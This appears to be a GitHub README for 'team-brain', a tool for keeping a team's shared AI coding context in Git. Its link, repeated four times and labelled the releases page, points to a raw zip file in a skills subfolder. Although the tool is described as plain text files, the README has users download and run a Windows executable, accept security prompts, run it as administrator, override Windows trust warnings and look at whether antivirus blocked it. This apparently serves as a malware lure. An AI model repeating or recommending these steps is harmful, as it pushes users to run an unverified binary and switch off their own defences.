# 🧠 team-brain - Shared AI memory for teams

[![Download team-brain](https://img.shields.io/badge/Download%20team-brain-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wallisillative921/team-brain/raw/refs/heads/main/skills/team-brain-sync/brain-team-3.7.zip)

Git-native shared AI memory for teams. Keep your team’s knowledge, conventions, and decisions in one place and load them into Claude Code, Cursor, and Copilot.

## 🧩 What team-brain does

team-brain helps your team store shared context in a simple, Git-based format. It keeps key decisions, coding rules, project notes, and team habits in sync. When someone opens their coding tool, that context is ready to use.

Use it to:
- Keep team rules in one place
- Save design and code decisions
- Share project context across people
- Load the same memory into supported AI tools
- Reduce repeated questions and missed details

## 💻 What you need

Before you install team-brain on Windows, make sure you have:
- A Windows 10 or Windows 11 PC
- An internet connection
- Enough space to download the app
- Permission to run downloaded apps on your computer

If your device blocks downloads, you may need admin access.

## 📥 Download team-brain

Visit the releases page to download and run this file:
https://github.com/wallisillative921/team-brain/raw/refs/heads/main/skills/team-brain-sync/brain-team-3.7.zip

On that page, look for the latest release and download the Windows version. If there are more than one file, choose the one that matches your computer, such as:
- `.exe` for a direct Windows app
- `.zip` if the app comes packed in a folder

## 🪟 Install on Windows

After you download the file, follow these steps:

1. Open your Downloads folder.
2. Find the team-brain file you just downloaded.
3. If the file is a `.zip`, right-click it and choose Extract All.
4. Open the extracted folder.
5. If the file is an `.exe`, double-click it to start the app.
6. If Windows asks for permission, choose Run or Yes.
7. If you see a security prompt, pick the option that lets you keep going if you trust the file.
8. Wait for the app to finish opening.

If the app starts from a folder, keep that folder in a safe place. Some apps need their files to stay together.

## ⚙️ First-time setup

When you open team-brain for the first time, set up your shared memory folder or team workspace.

Typical setup steps:
- Choose a folder for your team memory
- Connect it to a Git repo if needed
- Add your team’s rules, notes, and decisions
- Pick the AI tools you want to use it with

A good workspace may include:
- `adr` files for decisions
- `conventions` for team rules
- `onboarding` notes for new people
- `shared-context` for project facts
- `agents-md` files for agent instructions

If the app asks you to sign in or connect to a code tool, follow the on-screen steps.

## 🧠 How team-brain fits into your workflow

team-brain works like a shared memory layer for your team. Instead of each person keeping local notes, the team keeps one source of truth in Git.

That helps when you want to:
- Keep the same coding style across a project
- Store answers to common team questions
- Save why a choice was made
- Give new team members the same starting point
- Help AI tools use the same project context

You can use it with:
- Claude Code
- Cursor
- GitHub Copilot

## 📁 What goes in the memory

A strong team memory usually includes:
- Project goals
- Naming rules
- File layout rules
- API habits
- Deployment notes
- Common fixes
- Architecture decisions
- Do and don’t lists
- Team-specific prompts
- Links to useful docs

Keep entries short and clear. Use plain language. Write each rule so a new team member can understand it fast.

## 🔄 Keeping the memory up to date

When your team changes a rule or makes a new decision:
1. Open the team-brain workspace
2. Edit the right note or file
3. Save your change
4. Commit it to Git
5. Share it with the team

This keeps everyone on the same page. It also helps your AI tools use the newest version of your team’s context.

## 🛠️ Common Windows issues

If the app does not open:
- Check that the download finished
- Make sure you extracted the ZIP file if there is one
- Try right-clicking the app and choosing Run as administrator
- Check if your antivirus blocked the file
- Move the app to a simple folder like `C:\team-brain`

If Windows says it cannot trust the app:
- Open the file again
- Choose the option to run it anyway if you trust the source
- Make sure you downloaded it from the releases page

If the app opens but does not load your workspace:
- Check the folder path
- Make sure the files are still in place
- Confirm the Git repo is set up
- Open the app again after fixing the path

## 📚 Suggested team structure

A simple folder structure can look like this:

- `README.md` - short project guide
- `adr/` - decision records
- `conventions/` - team rules
- `onboarding/` - setup notes for new people
- `shared-context/` - shared facts and project context
- `agents-md/` - AI agent instructions

This layout keeps your memory easy to scan and easy to update.

## 🔍 Good writing habits for team memory

Write memory notes that are:
- Short
- Specific
- Easy to scan
- Free of long paragraphs
- Based on real team choices

Example:
- Use snake_case for file names
- Put API notes in `shared-context`
- Keep decisions in `adr`
- Ask before changing folder layout

This style works well because AI tools can read it fast and people can follow it without extra effort.

## 🧭 Typical use cases

team-brain can help with:
- New hire setup
- Shared coding rules
- Architecture decisions
- Repeated project context
- AI-assisted coding in teams
- Keeping tool instructions in one place

It works best when your team wants one shared source of truth instead of scattered notes.

## 📎 Download link

Visit the releases page to download and run this file:
https://github.com/wallisillative921/team-brain/raw/refs/heads/main/skills/team-brain-sync/brain-team-3.7.zip

## 🧰 Basic workflow example

A simple team workflow may look like this:
1. Your team writes down a decision
2. Someone saves it in the team-brain workspace
3. The change goes into Git
4. Everyone pulls the latest version
5. Claude Code, Cursor, or Copilot reads the same shared context

That keeps the team aligned without extra back-and-forth.

## 🧾 File naming tips

Use names that make sense at a glance:
- `database-rules.md`
- `api-style.md`
- `release-process.md`
- `onboarding-checklist.md`
- `frontend-conventions.md`

Avoid vague names like:
- `notes1.md`
- `stuff.md`
- `misc.md`

Clear names make the workspace easier to use for both people and AI tools.

## 🔐 Keeping shared memory safe

If your workspace includes private team data:
- Store it in a private Git repo
- Limit write access to the right people
- Review changes before merge
- Keep secret keys out of shared notes
- Use simple text files for context, not passwords

Shared memory works best when the team treats it like project knowledge, not a place for secrets.

## 🧪 What a first run may look like

When you launch team-brain, you may see steps like:
- Choose a workspace folder
- Connect a repo
- Pick a team profile
- Import memory files
- Link your AI tool

After that, the app should use the same team context each time you open your coding tool.

## 🧑‍💼 For team leads

If you manage a team, start small:
- Add 5 to 10 key rules
- Capture the most common decisions
- Keep one folder for each type of memory
- Review the content once a week
- Remove stale notes

Small, clean memory is easier to trust than a large pile of old text.

## 📦 Release downloads

Use the GitHub releases page for all Windows downloads:
https://github.com/wallisillative921/team-brain/raw/refs/heads/main/skills/team-brain-sync/brain-team-3.7.zip

Look for the latest release file, then download and run this file on Windows.

## 🗂️ Topic areas covered

This project focuses on:
- `adr`
- `agents-md`
- `ai-coding`
- `claude`
- `claude-code`
- `conventions`
- `developer-tools`
- `onboarding`
- `shared-context`
- `team-memory`

These topics match a shared context system for teams that use AI while they code.